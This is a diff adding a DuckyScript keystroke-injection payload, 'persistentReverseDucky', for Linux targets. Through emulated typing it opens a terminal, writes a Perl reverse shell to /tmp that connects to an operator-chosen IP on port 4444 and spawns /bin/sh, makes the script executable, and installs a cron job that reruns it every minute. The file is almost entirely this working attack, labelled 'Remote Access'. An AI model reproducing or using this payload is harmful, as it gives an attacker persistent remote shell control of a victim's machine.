@@ -1,0 +1,49 @@
+REM TITLE reverse shell linux
+REM AUTHOR 0xRuta
+REM DESCRIPTION
+REM Title: persistentReverseDucky
+REM Description: persistentReverseDucky creates a reverse shell using  a one liner payload in perl
+REM AUTHOR: 0xRuta
+REM Version: 1.0
+REM Category: Remote Access
+REM Target: Linux with perl installed
+REM Attackmodes: HID
+
+GUI 
+DELAY 2000
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+REM [creating reverse shell-change 0.0.0.0 to desired IP]
+DELAY 900
+STRING echo '#!/bin/bash\nperl -e '\''use Socket;$i="0.0.0.0";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''' > /tmp/reverse_shell.sh
+DELAY 900
+ENTER
+REM [make script executable]
+STRING chmod +x /tmp/reverse_shell.sh
+DELAY 1000
+ENTER
+REM [making sure crontab opens with VIM]
+STRING export VISUAL=vim
+DELAY 900
+ENTER
+DELAY 900
+REM [creating cron job for script]
+STRING crontab -e
+DELAY 900
+ENTER
+STRING i
+DELAY 500
+ENTER
+STRING * * * * * bash /tmp/reverse_shell.sh
+DELAY 500
+ENTER
+ESC
+DELAY 800
+STRING :wq
+DELAY 900
+ENTER
+STRING exit
+DELAY 200
+ENTER
